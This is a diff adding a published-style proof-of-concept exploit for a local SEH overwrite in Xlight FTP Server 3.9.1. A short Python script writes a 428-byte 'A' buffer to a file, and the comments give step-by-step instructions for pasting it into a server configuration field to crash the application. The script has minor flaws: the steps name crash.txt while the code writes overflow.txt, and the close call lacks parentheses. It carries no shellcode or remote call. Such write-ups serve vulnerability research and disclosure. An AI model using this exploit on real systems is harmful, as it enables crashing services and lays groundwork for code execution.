@@ -1,0 +1,33 @@
+# Exploit Title: Xlight 3.9.1 FTP Server SEH Overwrite
+# Google Dork: N/A
+# Date: 2019-02-24
+# Exploit Author: Logan Whitmire
+# Vendor Homepage: https://www.xlightftpd.com/index.htm
+# Software Link: https://www.xlightftpd.com/download/xlight.zip
+# Version: 3.9.1
+# Tested on: Windows XP
+# CVE : N/A
+
+
+POC:#!/usr/bin/python
+#Vulnerable Software: Xlight FTP Server 3.9.1
+#Link: https://www.xlightftpd.com/download.htm
+#Date: 2019-02-24
+#Twitter: thermal_tp
+#inspired by bzyo's exploit
+# 1. Generate overflow.txt, open, and copy contents to clipboard
+# 2. Virtual Server
+# 3. Modify Virtual Server Configuration
+# 4. Advanced
+# 5. Misc
+# 6. Execute a program after user logged in
+# 7. Setup
+# 8. Paste crash.txt contents
+# 9. Application crashes
+# 10. SEH is overwritten
+
+buffer="A"*428
+file="overflow.txt"
+generate=open(file, "w")
+generate.write(buffer)
+generate.close
